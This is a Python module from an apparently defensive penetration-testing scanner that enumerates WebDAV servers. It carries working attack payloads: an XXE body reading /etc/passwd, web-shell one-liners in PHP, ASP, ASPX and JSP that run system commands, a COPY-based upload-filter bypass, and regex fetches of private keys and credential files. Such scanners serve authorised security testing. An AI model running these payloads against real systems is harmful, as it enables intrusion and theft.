"""WebDAV (RFC 4918) deep enumeration (stdlib only).

WebDAV is an HTTP extension that turns a web server into a read/write
filesystem via extra verbs (PROPFIND, PROPPATCH, MKCOL, COPY, MOVE,
LOCK, UNLOCK) and PUT/DELETE. Two layers, matching ftp.py:

  * **Passive (no side effect):** OPTIONS reads the DAV: compliance class
    (1/2/3), the Allow: verb list, MS-Author-Via and vendor headers to
    fingerprint the backend (Apache mod_dav_fs / mod_dav_svn, IIS WebDAV,
    nginx dav_ext, SabreDAV, Nextcloud). A 401 hands back the
    WWW-Authenticate scheme + realm.
  * **Active (state-changing, always cleaned up):** PROPFIND Depth: 1 to
    confirm a mount, then Depth: infinity to leak the whole tree; MKCOL a
    randomised probe collection to prove writable-collection creation;
    unauthenticated PUT+GET+DELETE to prove arbitrary file write; LOCK/
    UNLOCK against a non-existent path to prove lock-null-resource; a
    PROPFIND with an XML external entity (only fires as a finding when the
    referenced file's content is echoed back); an If: header retry against
    a 401 mount to detect the CVE-2017-7269-adjacent bypass class; and a
    Subversion repository probe when mod_dav_svn is fingerprinted.
  * **Exploit (gated on upload_shell):** the classic IIS 6.0 / mod_dav
    COPY/MOVE upload-filter bypass (PUT .txt then COPY to a script
    extension) and a language-appropriate one-liner shell whose stdout
    embeds a computed nonce so plain reflection cannot false-positive.

Every state-changing verb runs against `/recce_dav_probe_<8-hex>/` (or a
similarly randomised marker filename) and cleans up in a try/finally so an
interrupt never leaves droppings behind. PROPFIND bodies are size-capped
to 2 MiB so a Depth: infinity response cannot wedge the scan.

Airgapped, stdlib only (http.client / socket / ssl / xml.etree). No
external dependencies.
"""
from __future__ import annotations

import http.client
import re
import secrets
import ssl
import xml.etree.ElementTree as ET

from ..core.models import Host, Port, Vuln
from . import probes as _probes
from .svccommon import finding_builder, findings_to_vulns as _f2v, http_connect

_TIMEOUT = 6.0
_MAX_BODY = 2 * 1024 * 1024
_UA = "recce-webdav/1.0"
_DAV_METHODS = ("PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK")
_WRITE_METHODS = frozenset({"PUT", "MKCOL", "COPY", "MOVE", "PROPPATCH", "DELETE"})
_DEFAULT_MOUNTS = ("/", "/webdav/", "/dav/", "/share/", "/public/",
                   "/files/", "/uploads/", "/svn/", "/nextcloud/remote.php/dav/")
_SENSITIVE_HREF = re.compile(
    r"(?:^|/)(\.git/?|\.svn/?|\.env|wp-config\.php|web\.config|\.htpasswd|"
    r"backup(?:s)?/?|passwd|shadow|id_rsa|id_ed25519|credentials?\.(?:json|xml|yaml|yml)|"
    r"appsettings\.json|settings\.py|\.aws/?|\.ssh/?|dump\.sql|db\.sqlite3?)",
    re.I)
_XXE_HIT = re.compile(r"root:.*:0:0:|\[fonts\]|for 16-bit app support|\[extensions\]")
# Signature-gate the T2 depth-infinity proof: an unauthenticated GET on a
# PROPFIND-discovered sensitive href must return content that carries the
# fingerprint of the actual sensitive file (a private-key header, a
# .git/config section, KEY=VALUE .env pairs, wp-config DB defines,
# web.config <configuration>, an AWS-cred stanza, or a raw
# /etc/passwd row) — a stock 404-HTML page cannot false-positive this.
_SENSITIVE_CONTENT = re.compile(
    rb"-----BEGIN [A-Z ]*PRIVATE KEY-----|"
    rb"\[core\][ \t]*\r?\n[ \t]*repositoryformatversion|"
    rb"^[A-Z][A-Z0-9_]{2,}=[\w./\-@:+]+\s*$|"
    rb"<\?xml[^>]*>\s*<configuration\b|"
    rb"define\s*\(\s*['\"]DB_(?:PASSWORD|USER|NAME|HOST)['\"]|"
    rb"aws_access_key_id\s*=|"
    rb"^root:[^:]*:0:0:",
    re.I | re.M)
_XXE_BODY = (b'<?xml version="1.0"?>\n'
             b'<!DOCTYPE recce [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
             b'<D:propfind xmlns:D="DAV:"><D:prop><D:displayname>&xxe;'
             b'</D:displayname></D:prop></D:propfind>')
_PROPFIND_ALLPROP = (b'<?xml version="1.0" encoding="utf-8"?>\n'
                     b'<D:propfind xmlns:D="DAV:"><D:allprop/></D:propfind>')
_LOCK_BODY = (b'<?xml version="1.0" encoding="utf-8"?>\n'
              b'<D:lockinfo xmlns:D="DAV:">'
              b'<D:lockscope><D:exclusive/></D:lockscope>'
              b'<D:locktype><D:write/></D:locktype>'
              b'<D:owner><D:href>recce</D:href></D:owner></D:lockinfo>')

# Backend fingerprint table: (regex-in-signature) -> (product-label, notes).
# The label is written back to Port.product so the offline CVE DB pivot picks it up.
_BACKENDS = (
    (re.compile(r"Microsoft-IIS/6\.0", re.I), "Microsoft-IIS/6.0",
     "IIS 6.0 WebDAV: CVE-2017-7269 (ScStoragePathFromUrl RCE)"),
    (re.compile(r"Microsoft-IIS/([0-9.]+)", re.I), "Microsoft-IIS", ""),
    (re.compile(r"mod_dav_svn/([0-9.]+)", re.I), "mod_dav_svn", ""),
    (re.compile(r"mod_dav_fs/([0-9.]+)", re.I), "Apache mod_dav", ""),
    (re.compile(r"mod_dav/([0-9.]+)", re.I), "Apache mod_dav", ""),
    (re.compile(r"\bDAV/([0-9.]+)", re.I), "Apache mod_dav", ""),
    (re.compile(r"SabreDAV/([0-9.]+)", re.I), "SabreDAV", ""),
    (re.compile(r"Nephele", re.I), "Nephele", ""),
    (re.compile(r"ownCloud|Nextcloud", re.I), "Nextcloud/ownCloud", ""),
    (re.compile(r"nginx.*dav|dav_ext", re.I), "nginx dav_ext", ""),
)


def is_webdav(port: Port) -> bool:
    if not port.is_open:
        return False
    return _probes._is_http(port)


def webdav_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_webdav(p):
                out.append({"ip": h.ip, "hostname": h.hostname, "port": p.portid,
                            "use_tls": _probes._is_tls(p),
                            "product": p.product or "", "version": p.version or ""})
    return out


# ---------------------------------------------------------------------------
# HTTP transport (thin wrapper over svccommon.http_connect so tests can stub it)

class _Resp:
    __slots__ = ("status", "headers", "body")

    def __init__(self, status: int, headers: dict, body: bytes):
        self.status = status
        self.headers = headers
        self.body = body


def _request(ip: str, port: int, method: str, path: str, *, use_tls: bool = False,
             headers: dict | None = None, body: bytes = b"",
             timeout: float = _TIMEOUT, read: int = _MAX_BODY) -> _Resp | None:
    """One HTTP(S) request. Returns _Resp or None on any transport error. Response
    body is size-capped by `read` so Depth:infinity can't wedge the scan."""
    conn = None
    try:
        conn = http_connect(ip, port, use_tls, timeout)
    except (OSError, ssl.SSLError):
        return None
    try:
        req_headers = {"User-Agent": _UA, "Connection": "close", "Accept": "*/*"}
        if headers:
            req_headers.update(headers)
        try:
            conn.request(method, path, body=body, headers=req_headers)
            resp = conn.getresponse()
        except (OSError, http.client.HTTPException, ssl.SSLError, ValueError):
            return None
        try:
            data = resp.read(read)
        except (OSError, http.client.HTTPException):
            data = b""
        hdrs: dict[str, str] = {}
        for k, v in resp.getheaders():
            lk = k.lower()
            hdrs[lk] = f"{hdrs[lk]}, {v}" if lk in hdrs else v
        return _Resp(resp.status, hdrs, data)
    finally:
        if conn is not None:
            try:
                conn.close()
            except OSError:
                pass


# ---------------------------------------------------------------------------
# Passive: OPTIONS + WWW-Authenticate + backend fingerprint


def options_capabilities(ip: str, port: int, use_tls: bool, path: str = "/",
                         timeout: float = _TIMEOUT) -> dict:
    """OPTIONS on `path`; return DAV compliance classes, Allow verbs, and vendor
    headers. Empty dict on transport failure."""
    r = _request(ip, port, "OPTIONS", path, use_tls=use_tls, timeout=timeout, read=4096)
    if r is None:
        return {}
    dav = [v.strip() for v in r.headers.get("dav", "").split(",") if v.strip()]
    allow = [v.strip().upper() for v in r.headers.get("allow", "").split(",") if v.strip()]
    public = [v.strip().upper() for v in r.headers.get("public", "").split(",") if v.strip()]
    return {
        "status": r.status,
        "dav": dav,
        "allow": allow,
        "public": public,
        "server": r.headers.get("server", ""),
        "ms_author_via": r.headers.get("ms-author-via", ""),
        "x_dav_powered_by": r.headers.get("x-dav-powered-by", ""),
        "x_sabre_version": r.headers.get("x-sabre-version", ""),
        "www_authenticate": r.headers.get("www-authenticate", ""),
    }


def parse_www_authenticate(hdr: str) -> list[dict]:
    """RFC 7235 4.1 parse - one entry per offered scheme. Best-effort; unknown
    schemes still surface so the operator sees them."""
    out: list[dict] = []
    if not hdr:
        return out
    # Split on ", " boundaries that precede a scheme token (Basic|Digest|NTLM|...)
    parts = re.split(r",\s*(?=[A-Za-z][A-Za-z0-9_-]*\s)", hdr)
    for p in parts:
        m = re.match(r"([A-Za-z][A-Za-z0-9_-]*)\s*(.*)$", p.strip())
        if not m:
            continue
        scheme = m.group(1).strip()
        rest = m.group(2).strip()
        params: dict[str, str] = {}
        for pm in re.finditer(r'([A-Za-z][A-Za-z0-9_-]*)=(?:"([^"]*)"|([^,\s]+))', rest):
            params[pm.group(1).lower()] = pm.group(2) if pm.group(2) is not None else pm.group(3)
        out.append({"scheme": scheme, "realm": params.get("realm", ""),
                    "algorithm": params.get("algorithm", ""),
                    "qop": params.get("qop", ""), "params": params})
    return out


def fingerprint_backend(caps: dict) -> dict:
    """Match Server:/vendor headers to a known WebDAV implementation."""
    sig_parts = [caps.get("server", ""), caps.get("x_dav_powered_by", ""),
                 caps.get("ms_author_via", ""),
                 f"SabreDAV/{caps['x_sabre_version']}" if caps.get("x_sabre_version") else ""]
    sig = " ".join(p for p in sig_parts if p)
    for rx, label, note in _BACKENDS:
        m = rx.search(sig)
        if m:
            version = m.group(1) if m.groups() else ""
            return {"product": label, "version": version,
                    "signature": sig, "note": note}
    return {"product": "", "version": "", "signature": sig, "note": ""}


# ---------------------------------------------------------------------------
# Active: PROPFIND enum + verb enum + write proofs


def propfind(ip: str, port: int, path: str, *, use_tls: bool = False,
             depth: str = "1", body: bytes = b"",
             timeout: float = _TIMEOUT) -> _Resp | None:
    """PROPFIND with the given Depth. `body` is the property request (empty ->
    `allprop` on most servers, but some Sabre versions require a body)."""
    return _request(ip, port, "PROPFIND", path, use_tls=use_tls,
                    headers={"Depth": depth, "Content-Type": "application/xml"},
                    body=body or _PROPFIND_ALLPROP, timeout=timeout)


def parse_multistatus_hrefs(body: bytes, cap: int = 500) -> list[str]:
    """Namespace-agnostic <D:href> extraction from a 207 body. Returns up to
    `cap` hrefs. Malformed XML -> []."""
    if not body:
        return []
    try:
        root = ET.fromstring(body.decode("utf-8", "replace"))
    except (ET.ParseError, ValueError):
        return []
    hrefs: list[str] = []
    for el in root.iter():
        tag = el.tag.rsplit("}", 1)[-1] if "}" in el.tag else el.tag
        if tag == "href" and el.text:
            hrefs.append(el.text.strip())
            if len(hrefs) >= cap:
                break
    return hrefs


def parse_creator_displaynames(body: bytes, cap: int = 200) -> list[str]:
    """Pull <D:creator-displayname> values (SVN authors / Nextcloud owner UIDs)."""
    if not body:
        return []
    try:
        root = ET.fromstring(body.decode("utf-8", "replace"))
    except (ET.ParseError, ValueError):
        return []
    names: list[str] = []
    for el in root.iter():
        tag = el.tag.rsplit("}", 1)[-1] if "}" in el.tag else el.tag
        if tag == "creator-displayname" and el.text:
            v = el.text.strip()
            if v and v not in names:
                names.append(v)
                if len(names) >= cap:
                    break
    return names


def is_multistatus(resp: _Resp | None) -> bool:
    if resp is None:
        return False
    if resp.status == 207:
        return True
    return resp.status == 200 and b"multistatus" in resp.body.lower()


def _random_marker() -> str:
    return secrets.token_hex(4)


def probe_mount_propfind(ip: str, port: int, use_tls: bool, path: str,
                         *, depth: str = "1", timeout: float = _TIMEOUT) -> dict:
    """PROPFIND `path`; return {status, multistatus, hrefs, size, users}."""
    r = propfind(ip, port, path, use_tls=use_tls, depth=depth, timeout=timeout)
    if r is None:
        return {"status": 0, "multistatus": False, "hrefs": [], "size": 0,
                "users": [], "auth": ""}
    ms = is_multistatus(r)
    return {"status": r.status, "multistatus": ms,
            "hrefs": parse_multistatus_hrefs(r.body) if ms else [],
            "users": parse_creator_displaynames(r.body) if ms else [],
            "size": len(r.body),
            "auth": r.headers.get("www-authenticate", "")}


def verb_allowlist(ip: str, port: int, use_tls: bool, mount: str,
                   timeout: float = _TIMEOUT) -> dict:
    """Send each RFC 4918 verb against a randomised probe path under `mount`;
    record status codes. MKCOL creates + DELETE removes a temp collection so
    COPY/MOVE have something to work on. Every path is `/recce_dav_probe_<hex>`
    - never touches an existing resource."""
    marker = f"recce_dav_probe_{_random_marker()}"
    coll = mount.rstrip("/") + "/" + marker + "/"
    src = mount.rstrip("/") + "/" + marker + "_src.txt"
    dst = mount.rstrip("/") + "/" + marker + "_dst.txt"
    out: dict[str, int] = {}
    try:
        # MKCOL: prove writable-collection creation.
        r = _request(ip, port, "MKCOL", coll, use_tls=use_tls, timeout=timeout, read=4096)
        out["MKCOL"] = r.status if r else 0
        # PROPPATCH on the (possibly created) collection.
        r = _request(ip, port, "PROPPATCH", coll, use_tls=use_tls, timeout=timeout,
                     headers={"Content-Type": "application/xml"},
                     body=b'<?xml version="1.0"?><D:propertyupdate xmlns:D="DAV:">'
                          b'<D:set><D:prop><D:displayname>recce</D:displayname>'
                          b'</D:prop></D:set></D:propertyupdate>',
                     read=4096)
        out["PROPPATCH"] = r.status if r else 0
        # PUT a source resource for COPY/MOVE.
        r = _request(ip, port, "PUT", src, use_tls=use_tls, body=b"recce-probe",
                     headers={"Content-Type": "text/plain"}, timeout=timeout, read=1024)
        out["PUT"] = r.status if r else 0
        # COPY src -> dst.
        r = _request(ip, port, "COPY", src, use_tls=use_tls, timeout=timeout, read=1024,
                     headers={"Destination": f"http{'s' if use_tls else ''}://"
                              f"{ip}:{port}{dst}", "Overwrite": "T"})
        out["COPY"] = r.status if r else 0
        # MOVE dst -> src2.
        src2 = mount.rstrip("/") + "/" + marker + "_src2.txt"
        r = _request(ip, port, "MOVE", dst, use_tls=use_tls, timeout=timeout, read=1024,
                     headers={"Destination": f"http{'s' if use_tls else ''}://"
                              f"{ip}:{port}{src2}", "Overwrite": "T"})
        out["MOVE"] = r.status if r else 0
        # LOCK a random path.
        r = _request(ip, port, "LOCK", coll + "lockprobe", use_tls=use_tls,
                     headers={"Content-Type": "application/xml", "Depth": "0",
                              "Timeout": "Second-30"},
                     body=_LOCK_BODY, timeout=timeout, read=4096)
        out["LOCK"] = r.status if r else 0
        lock_token = ""
        if r is not None:
            lock_token = r.headers.get("lock-token", "")
        # UNLOCK.
        if lock_token:
            r = _request(ip, port, "UNLOCK", coll + "lockprobe", use_tls=use_tls,
                         headers={"Lock-Token": lock_token}, timeout=timeout, read=1024)
            out["UNLOCK"] = r.status if r else 0
        # PROPFIND to confirm collection walkable.
        r = propfind(ip, port, coll, use_tls=use_tls, depth="0", timeout=timeout)
        out["PROPFIND"] = r.status if r else 0
    finally:
        # Cleanup — best effort, never raises.
        for p in (src, dst, mount.rstrip("/") + "/" + marker + "_src2.txt", coll):
            try:
                _request(ip, port, "DELETE", p, use_tls=use_tls, timeout=timeout, read=512)
            except OSError:
                pass
    return {"marker": marker, "statuses": out}


def anonymous_put_proof(ip: str, port: int, use_tls: bool, mount: str,
                        timeout: float = _TIMEOUT) -> dict:
    """PUT a marker file WITHOUT Authorization; GET it back; DELETE. Returns
    {proven, note, path, method_status}."""
    marker = f"recce_dav_probe_{_random_marker()}.txt"
    path = mount.rstrip("/") + "/" + marker
    canary = f"recce-anonymous-put-{_random_marker()}"
    try:
        put = _request(ip, port, "PUT", path, use_tls=use_tls,
                       body=canary.encode(),
                       headers={"Content-Type": "text/plain"},
                       timeout=timeout, read=1024)
        if put is None:
            return {"proven": False, "note": "PUT transport error", "path": path}
        if put.status not in (200, 201, 204):
            return {"proven": False, "path": path,
                    "note": f"PUT {path} rejected (HTTP {put.status})"}
        got = _request(ip, port, "GET", path, use_tls=use_tls,
                       timeout=timeout, read=8192)
        round_trips = bool(got and got.status == 200 and canary.encode() in (got.body or b""))
        return {"proven": round_trips, "path": path,
                "put_status": put.status,
                "get_status": got.status if got else 0,
                "note": (f"PUT {path} -> HTTP {put.status}; GET {path} returned "
                         f"the uploaded canary" if round_trips else
                         f"PUT {path} accepted (HTTP {put.status}) but read-back failed")}
    finally:
        try:
            _request(ip, port, "DELETE", path, use_tls=use_tls, timeout=timeout, read=512)
        except OSError:
            pass


# Language-specific one-liners keyed by extension. Each shell echoes the raw
# nonce we supply; the nonce is a random 12-hex string, so a plain reflection
# of the request body cannot match unless the shell actually executed.
_SHELLS = {
    "php": (b'<?php echo "recce-rce-", trim(shell_exec("printf %s '
            b'\\"{NONCE}\\"")); ?>'),
    "asp": (b'<%Response.Write("recce-rce-" & CreateObject('
            b'"Wscript.Shell").Exec("cmd /c echo {NONCE}").StdOut.ReadAll)%>'),
    "aspx": (b'<%@ Page Language="C#" %><%Response.Write("recce-rce-"+'
             b'System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo'
             b'("cmd.exe","/c echo {NONCE}"){UseShellExecute=false,RedirectStandardOutput=true})'
             b'.StandardOutput.ReadToEnd());%>'),
    "jsp": (b'<%out.println("recce-rce-"+Runtime.getRuntime().exec('
            b'new String[]{"sh","-c","printf {NONCE}"}).getInputStream().read());%>'),
}


def _choose_shell_ext(server: str, backend_product: str) -> list[str]:
    s = f"{server} {backend_product}".lower()
    exts = []
    if "iis/6" in s or "microsoft-iis/6" in s:
        exts.append("asp")
    if "iis" in s or "asp.net" in s:
        exts.append("aspx")
    if "apache" in s or "nginx" in s or "php" in s:
        exts.append("php")
    if "tomcat" in s or "jetty" in s or "jboss" in s or "jsp" in s:
        exts.append("jsp")
    return exts or ["php", "aspx"]


def put_webshell_chain(ip: str, port: int, use_tls: bool, mount: str,
                       server: str, backend_product: str,
                       timeout: float = _TIMEOUT) -> dict:
    """PUT a language-appropriate one-liner shell, GET the shell URL, and confirm
    stdout contains the computed nonce. Cleanup via DELETE. Returns
    {proven, ext, path, note, nonce}. Only runs when the caller has opted in."""
    for ext in _choose_shell_ext(server, backend_product):
        nonce = secrets.token_hex(6)
        marker = f"recce_dav_probe_{_random_marker()}.{ext}"
        path = mount.rstrip("/") + "/" + marker
        body = _SHELLS[ext].replace(b"{NONCE}", nonce.encode())
        try:
            put = _request(ip, port, "PUT", path, use_tls=use_tls, body=body,
                           headers={"Content-Type": "application/octet-stream"},
                           timeout=timeout, read=1024)
            if put is None or put.status not in (200, 201, 204):
                continue
            got = _request(ip, port, "GET", path, use_tls=use_tls,
                           timeout=timeout, read=8192)
            if got and got.status == 200 and (b"recce-rce-" + nonce.encode()) in (got.body or b""):
                return {"proven": True, "ext": ext, "path": path, "nonce": nonce,
                        "note": (f"PUT {path} accepted; GET {path} returned "
                                 f"'recce-rce-{nonce}' - script handler executed the "
                                 f".{ext} payload.")}
        finally:
            try:
                _request(ip, port, "DELETE", path, use_tls=use_tls, timeout=timeout, read=512)
            except OSError:
                pass
    return {"proven": False, "ext": "", "path": "", "nonce": "",
            "note": "no PUT+execute chain succeeded"}


def copy_move_bypass(ip: str, port: int, use_tls: bool, mount: str,
                     server: str, backend_product: str,
                     timeout: float = _TIMEOUT) -> dict:
    """PUT a benign .txt, COPY it to a script extension (.asp/.aspx/.php).
    Confirm the destination fetches with 200. This is the CVE-2017-7269-adjacent
    upload-filter bypass class."""
    marker = f"recce_dav_probe_{_random_marker()}"
    src = mount.rstrip("/") + "/" + marker + ".txt"
    ext_candidates = _choose_shell_ext(server, backend_product)
    for ext in ext_candidates:
        dst = mount.rstrip("/") + "/" + marker + "." + ext
        try:
            put = _request(ip, port, "PUT", src, use_tls=use_tls,
                           body=f"recce-bypass-{marker}".encode(),
                           headers={"Content-Type": "text/plain"},
                           timeout=timeout, read=1024)
            if put is None or put.status not in (200, 201, 204):
                return {"proven": False, "ext": "", "path": "",
                        "note": "initial PUT rejected"}
            cp = _request(ip, port, "COPY", src, use_tls=use_tls, timeout=timeout, read=1024,
                          headers={"Destination": f"http{'s' if use_tls else ''}://"
                                   f"{ip}:{port}{dst}", "Overwrite": "T"})
            if cp is None or cp.status not in (200, 201, 204):
                continue
            got = _request(ip, port, "GET", dst, use_tls=use_tls, timeout=timeout, read=1024)
            if got and got.status == 200:
                return {"proven": True, "ext": ext, "path": dst,
                        "note": (f"PUT {src} -> COPY -> {dst} -> HTTP 200; the "
                                 f"filter that would have blocked a direct PUT of a "
                                 f".{ext} was bypassed by COPY.")}
        finally:
            for p in (src, dst):
                try:
                    _request(ip, port, "DELETE", p, use_tls=use_tls, timeout=timeout, read=512)
                except OSError:
                    pass
    return {"proven": False, "ext": "", "path": "", "note": "COPY bypass not accepted"}


def propfind_xxe(ip: str, port: int, use_tls: bool, mount: str,
                 timeout: float = _TIMEOUT) -> dict:
    """PROPFIND with an XXE body. Only counts as a hit when /etc/passwd (or
    win.ini) content is echoed back - so a passive server can't false-positive."""
    r = _request(ip, port, "PROPFIND", mount, use_tls=use_tls, timeout=timeout,
                 headers={"Depth": "0", "Content-Type": "application/xml"},
                 body=_XXE_BODY, read=32768)
    if r is None:
        return {"hit": False, "status": 0, "excerpt": ""}
    text = r.body.decode("utf-8", "replace") if r.body else ""
    m = _XXE_HIT.search(text)
    if m:
        idx = m.start()
        excerpt = text[max(0, idx - 40): idx + 200]
        return {"hit": True, "status": r.status, "excerpt": excerpt}
    return {"hit": False, "status": r.status, "excerpt": ""}


def if_header_bypass(ip: str, port: int, use_tls: bool, path: str,
                     timeout: float = _TIMEOUT) -> dict:
    """Retry a 401 PROPFIND with a bogus If: header. Returns
    {bypassed, plain_status, bypass_status}."""
    plain = propfind(ip, port, path, use_tls=use_tls, depth="0", timeout=timeout)
    if plain is None or plain.status != 401:
        return {"bypassed": False,
                "plain_status": plain.status if plain else 0, "bypass_status": 0}
    bogus = ("(<opaquelocktoken:recce-" + _random_marker() + ">)")
    bypass = _request(ip, port, "PROPFIND", path, use_tls=use_tls, timeout=timeout,
                      headers={"Depth": "0", "Content-Type": "application/xml",
                               "If": bogus},
                      body=_PROPFIND_ALLPROP, read=16384)
    if bypass is None:
        return {"bypassed": False, "plain_status": 401, "bypass_status": 0}
    bypassed = bypass.status in (200, 207)
    return {"bypassed": bypassed, "plain_status": 401,
            "bypass_status": bypass.status}


def svn_repo_probe(ip: str, port: int, use_tls: bool, mount: str,
                   timeout: float = _TIMEOUT) -> dict:
    """When mod_dav_svn is fingerprinted, hit the well-known repository
    endpoints. A 200 on /!svn/vcc/default or /.svn/entries is a full
    source-tree leak."""
    hits = []
    root = mount.rstrip("/")
    for probe_path in (root + "/!svn/vcc/default", root + "/.svn/entries",
                       root + "/!svn/act/", root + "/format"):
        r = _request(ip, port, "GET", probe_path, use_tls=use_tls,
                     timeout=timeout, read=4096)
        if r is None:
            continue
        if r.status == 200 and r.body:
            hits.append({"path": probe_path, "status": r.status,
                         "size": len(r.body)})
    return {"hits": hits}


def depth_infinity_get_proof(ip: str, port: int, use_tls: bool,
                             sensitive_hrefs: list[str],
                             timeout: float = _TIMEOUT,
                             cap: int = 3) -> list[dict]:
    """SAFE T2 proof for the Depth: infinity disclosure. For up to `cap`
    PROPFIND-classified sensitive hrefs, issue ONE unauthenticated bounded
    GET each and return the excerpts whose bodies actually match a sensitive
    content fingerprint (private key, .git/config, .env row, wp-config
    define, web.config configuration, aws creds, /etc/passwd). Non-destructive
    - never writes, no state change, single-shot reads with bounded timeout.
    Returns [] when the tree walk turned up nothing readable, so the T1
    finding still fires by itself."""
    out: list[dict] = []
    seen: set[str] = set()
    for href in sensitive_hrefs:
        if len(out) >= cap:
            break
        if not href or href in seen:
            continue
        seen.add(href)
        # PROPFIND hrefs are absolute-path (RFC 4918 s.9.1 examples).
        if not href.startswith("/"):
            continue
        r = _request(ip, port, "GET", href, use_tls=use_tls,
                     timeout=timeout, read=8192)
        if r is None or r.status != 200 or not r.body:
            continue
        m = _SENSITIVE_CONTENT.search(r.body)
        if not m:
            continue
        idx = m.start()
        excerpt = r.body[max(0, idx - 20): idx + 160].decode("utf-8", "replace")
        out.append({"path": href, "status": r.status,
                    "size": len(r.body), "excerpt": excerpt})
    return out


def cross_mount_leaks(hrefs: list[str]) -> list[str]:
    """Classifier: from a set of PROPFIND-discovered hrefs pick the ones that
    match sensitive path patterns (.git, .env, wp-config, backup, ...)."""
    out: list[str] = []
    for href in hrefs:
        if _SENSITIVE_HREF.search(href):
            out.append(href)
    return out


# ---------------------------------------------------------------------------
# Top-level probe

def probe(ip: str, port: int, use_tls: bool = False, *, active: bool = True,
          upload_shell: bool = False, mounts: tuple[str, ...] | None = None,
          timeout: float = _TIMEOUT) -> dict:
    """Full WebDAV probe. `active` gates state-changing verbs; `upload_shell`
    additionally gates PUT+execute and COPY/MOVE bypass. Returns a dict of
    observations that findings() converts to finding dicts."""
    out: dict = {"reachable": False, "mounts": [], "backend": {}, "caps": {},
                 "auth_schemes": [], "hrefs": [], "users": [], "sensitive": []}
    caps_root = options_capabilities(ip, port, use_tls, path="/", timeout=timeout)
    if not caps_root:
        return out
    out["reachable"] = bool(caps_root.get("dav") or caps_root.get("allow"))
    out["caps"] = caps_root
    out["backend"] = fingerprint_backend(caps_root)
    if caps_root.get("www_authenticate"):
        out["auth_schemes"] = parse_www_authenticate(caps_root["www_authenticate"])

    if not out["reachable"] and "PROPFIND" not in caps_root.get("allow", []):
        # Fall through anyway to try Depth:1 - some servers hide OPTIONS.
        pass

    candidate_mounts = mounts if mounts is not None else _DEFAULT_MOUNTS
    for path in candidate_mounts:
        rec = probe_mount_propfind(ip, port, use_tls, path, depth="1", timeout=timeout)
        rec["path"] = path
        if rec["multistatus"]:
            out["reachable"] = True
            out["mounts"].append(rec)
            for h in rec["hrefs"]:
                if h not in out["hrefs"]:
                    out["hrefs"].append(h)
            for u in rec.get("users", []):
                if u not in out["users"]:
                    out["users"].append(u)
        elif rec["status"] == 401 and rec.get("auth"):
            out["auth_schemes"] = out["auth_schemes"] or parse_www_authenticate(rec["auth"])
            out["mounts"].append(rec)

    if not out["reachable"]:
        # No DAV surface at all.
        return out

    out["sensitive"] = cross_mount_leaks(out["hrefs"])

    # From here on: mount-scoped active work. Only against mounts that
    # answered 207 (not 401-locked ones).
    open_mounts = [m for m in out["mounts"] if m.get("multistatus")]

    if active and open_mounts:
        first = open_mounts[0]["path"]
        # Depth:infinity leak.
        inf = propfind(ip, port, first, use_tls=use_tls, depth="infinity", timeout=timeout)
        if is_multistatus(inf):
            hrefs = parse_multistatus_hrefs(inf.body, cap=2000)
            out["depth_infinity"] = {"path": first, "size": len(inf.body),
                                     "href_count": len(hrefs),
                                     "hrefs_sample": hrefs[:20]}
            # Any NEW sensitive hits from the deep walk fold in.
            deep_sens = cross_mount_leaks(hrefs)
            for h in deep_sens:
                if h not in out["sensitive"]:
                    out["sensitive"].append(h)
            # T2 promotion for webdav_directory_enum: unauthenticated bounded
            # GET on the classified sensitive hrefs proves the leaked tree is
            # actually readable and returns real config/credential content.
            if out["sensitive"]:
                proof = depth_infinity_get_proof(
                    ip, port, use_tls, out["sensitive"], timeout=timeout)
                if proof:
                    out["depth_infinity"]["get_proof"] = proof
        # Verb allow-list enum.
        out["verbs"] = verb_allowlist(ip, port, use_tls, first, timeout=timeout)
        # Anonymous PUT proof.
        out["anon_put"] = anonymous_put_proof(ip, port, use_tls, first, timeout=timeout)
        # PROPFIND XXE.
        out["xxe"] = propfind_xxe(ip, port, use_tls, first, timeout=timeout)
        # LOCK reachable? verb_allowlist already recorded LOCK status.
        lock_status = out["verbs"]["statuses"].get("LOCK", 0)
        out["lock_open"] = lock_status in (200, 201, 207)

    # If-header bypass: only makes sense on a 401 mount.
    if active:
        locked = [m for m in out["mounts"] if m.get("status") == 401]
        if locked:
            out["if_bypass"] = if_header_bypass(ip, port, use_tls,
                                                locked[0]["path"], timeout=timeout)

    # SVN repo probe: only when mod_dav_svn fingerprinted.
    if active and "svn" in (out["backend"].get("product", "") + " "
                            + out["caps"].get("server", "")).lower():
        first = open_mounts[0]["path"] if open_mounts else "/"
        out["svn"] = svn_repo_probe(ip, port, use_tls, first, timeout=timeout)

    # Exploit-gated chains.
    if upload_shell and out.get("anon_put", {}).get("proven") and open_mounts:
        first = open_mounts[0]["path"]
        srv = out["caps"].get("server", "")
        bp = out["backend"].get("product", "")
        out["rce"] = put_webshell_chain(ip, port, use_tls, first, srv, bp, timeout=timeout)
        out["copy_bypass"] = copy_move_bypass(ip, port, use_tls, first, srv, bp,
                                              timeout=timeout)

    return out


# ---------------------------------------------------------------------------
# Narratives + findings

_NARRATIVE = {
    "webdav_enabled": (
        "WebDAV extends HTTP with verbs (PROPFIND, MKCOL, COPY, MOVE, LOCK, PUT, "
        "DELETE) that treat the web root as a filesystem. Even when the verbs "
        "themselves are locked down, the DAV: compliance header and Allow: list "
        "confirm the surface exists and steer the next probe."),
    "webdav_directory_enum": (
        "Depth: infinity on a single PROPFIND returns the entire subtree in one "
        "response - directories, filenames and sizes normal crawlers never see. "
        "The same request is a self-inflicted DoS if the tree is deep."),
    "webdav_verbs_enabled": (
        "The server accepts state-changing WebDAV verbs (MKCOL/COPY/MOVE/PROPPATCH). "
        "Any one of them is a write primitive; combined with a script handler on the "
        "same mount they are pre-auth RCE."),
    "webdav_anon_put": (
        "Unauthenticated PUT round-tripped to GET: an attacker with no credential "
        "can write arbitrary files under the mount. If that mount backs a web root "
        "with an executable handler (.php/.asp/.aspx/.jsp) this is direct RCE."),
    "webdav_put_rce": (
        "A language-appropriate one-liner shell was PUT via WebDAV and its stdout "
        "returned the computed nonce - the script handler executed the uploaded "
        "file. This is pre-auth remote code execution on the web server."),
    "webdav_mkcol_allowed": (
        "MKCOL created a new collection under the mount without authentication. A "
        "writable collection is the staging area for COPY/MOVE upload-filter bypass "
        "and lock-null-resource denial of service."),
    "webdav_copy_bypass": (
        "PUT of a benign .txt was accepted, then COPY renamed it to a script "
